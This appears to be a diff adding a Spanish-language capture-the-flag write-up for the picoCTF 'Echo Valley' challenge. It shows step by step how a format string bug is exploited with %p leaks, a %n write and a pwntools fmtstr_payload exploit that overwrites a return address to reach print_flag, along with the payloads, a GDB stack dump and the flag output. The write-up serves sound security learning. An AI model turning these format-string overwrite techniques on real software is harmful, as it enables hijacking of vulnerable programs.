@@ -1,0 +1,127 @@
+Okey ahi tengo las direcciones que estan en la funcion main()
+
+0x5949cd3fc401 -> 27 (donde inicia la funcion main)
+0x5949cd3fc413 -> 21 (a al que regresa despues de que llama a la funcion echo_valley() posible sobreescritura)
+
+0x0000000000001269 -> Donde inica la funcion print_flag
+En decimal -> 4713
+
+diferencia
+
+Notamos que podemos utilizar el slot 6 de la pila para escribir en memoria. Ya que notamos lo siguiente:
+
+Welcome to the Echo Valley, Try Shouting: 
+AAAAAAAA %6$p
+You heard in the distance: AAAAAAAA 0x4141414141414141
+
+Note que en el slot 6 se ponen todas las As que pase de primero en el input.
+
+Ahora nuestro objetivo sobreescribir la direccion de echo_valley(), para eso vamos a utilizar el %n. Que voy a 
+dar una explicacion rapida de como se usa.
+
+int val = 0;
+printf("AAAA%n", &val);
+
+Aqui lo qu se va a hacer es guardar la informacion en la variable val por medio de la sentencia %n, entonces la 
+variable val va a tomar el valor de 4, ya que 4 caracteres antes del %n.
+
+Entonces tengo que tener cuidado como le voy a pasar la direccion para poder sobreescribir. Primero tomamos
+la direccion y vamos a intentar sobre escribir el slot 6 con la direccion de retorno.
+
+5949cd3fc413 => (bytes strings) \x59\x49\xcd\x3f\xc4\x13 => (little endian) \x13\xc4\x3f\xcd\x49\x59
+
+Intentamos pasarle eso como entrada pero pasa lo siguiente:
+
+Welcome to the Echo Valley, Try Shouting: 
+\x13\xc4\x3f\xcd\x49\x59 %6$p
+You heard in the distance: \x13\xc4\x3f\xcd\x49\x59 0x3463785c3331785c
+
+Notamos que no sobreescribimos nada, ya que el programa esta tomando el input como caracteres separados. Es decir,
+trata cualquier caracter como un byte string y despues lo pasa a hexadecimal.
+
+Entonces procedemos a usar python, con el siguiente comando:
+
+python3 -c "import sys; sys.stdout.buffer.write(b'\x13\xc4\x3f\xcd\x49\x59 %6\$p')"
+
+Le pasamos la salida de ese comando al binario y obtenemos:
+
+Welcome to the Echo Valley, Try Shouting: 
+You heard in the distance: �?�IY 0x25205949cd3fc413
+EOF detected. Exiting...
+
+Notamos que ya pudimos sobreescribir y ahi esta nuestra direccion. Pero faltan los primeros 4 numeros (2520), 
+en una maquina de 64 bits se acostumbra que se rellene con 0s, entonces se deberia de ver algo asi
+00005949cd3fc413, pero \x00 se toma como un caracter nulo y rompe la escritura.
+
+Los datos de la direccion donde inicia la funcion de print_flag() son los siguiente:
+
+0x0000000000001269 -> Donde inica la funcion print_flag
+En decimal -> 4713 - 2 = 4711
+
+EL autor toca temas de "address splitting" y "sending in chunks" porque el numero decimal que le estaba quedando era
+muy grande, entonces iba a durar mucho. Al final investigo acerca de estas tecnicas y las explico un poco.
+
+Vamos a utilizar pwntools para hacer un exploit, se va a llamar exploit.py, va a estar en la misma carpeta y
+va a tener su documentacion clara.
+
+En el exploit nos pide el offse que es 6. La direccion que queremos sobrescribir y lo que queremos escribir.
+Lo pasamos en formato decimal, la biblioteca por abajo de encarga de toda la mate.
+
+Metemos los datos pero no resulta.
+Vamos a debugear un poco mas, ponemos un breakpoint en la funcion echo_valley() y vemos la pila:
+
+x/20gx $rsp
+0x7fffffffdc20:	0x0000000000800000	0x0000000000140000
+0x7fffffffdc30:	0x000000000000c000	0x00007fffffffdc68
+0x7fffffffdc40:	0x0000008c00000006	0x0000000000000000
+0x7fffffffdc50:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc60:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc80:	0x0000000000000000	0x00007ffff7fe5af0
+0x7fffffffdc90:	0x00007fffffffdca0	0x0000555555555413
+0x7fffffffdca0:	0x00007fffffffdd40	0x00007ffff7c2a1ca
+0x7fffffffdcb0:	0x00007fffffffdcf0	0x00007fffffffddc8
+
+Notamos que en la direccion, 0x7fffffffdc90 en la segunda columna, tenemos la direccion de retorno, ese espacio es
+lo que queremos sobreescribir. Entonces volvemos a hacer leak de informacion. Y descubrimos que la direccion 
+0x7fffffffdca0 esta en el slot 20, entonces ya tenemos el leak, solo le restamos 8 bytes para que nos quede apuntando
+al espacio de memoria que nos interesa.
+
+Enter: %20$p %21$p
+You heard in the distance: 0x7ffc80ced050 0x5838b2f4f413
+
+Tenemos las 2 informacion, le quitamos 8 bytes a la primera direccion y la pasamos a formato decimal:
+
+Primera direccion: 140722469523528
+
+Ahora a la direccion 0x5838b2f4f413, lo que hacemos es cambiarle el 413 por 269, que es el tail de la direccion donde
+inicia print_flag, tambien la pasamos a decimal. 
+
+Segunda direccion: 97000543810153
+
+Ya sabemos que el offset el 6, porque es el primer slot de memoria que controlamos. Tiramos el exploit
+
+Enter: ready
+Enter offset: 6
+Enter address to overwrite to: 140722469523528
+Enter new address to write: 97000543810153
+Payload lenght:  64
+
+Nos da de respuesta:
+
+\x00H\xd0΀\xfc\x7fThe Valley Disappears
+Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}
+[*] Got EOF while reading in interactive
+
+Ya conseguimos la flag, este reto es de mucho estar tocando pila y jugar con las direcciones de memoria y saber
+calcularlas.
+
+# Tengo que documentar
+fmtstr_payload -> Fue la instruccion que esta pwntools que me simplifica y automatiza la parte matematica 
+en format strings, y explicar los parametros que se usaron.
+
+
+Link de referencia:
+
+https://systemweakness.com/down-the-rabbit-hole-of-format-string-vulnerability-echo-valley-picoctf-2025-189f1cefed5f
+
